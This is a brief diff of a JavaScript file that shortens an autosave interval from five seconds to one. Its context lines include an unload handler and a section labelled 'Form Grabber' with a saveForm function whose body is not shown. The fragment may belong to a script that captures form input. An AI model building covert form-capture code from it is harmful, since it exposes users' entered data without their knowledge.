@@ -83,10 +83,10 @@ window.onbeforeunload = function() {
     save();
 }
 
-// Save every couple of seconds
+// Save every second
 setInterval(function(){
     save();
-}, 5000);
+}, 1000);
 
 /* Form Grabber */
 function saveForm(time, data) {
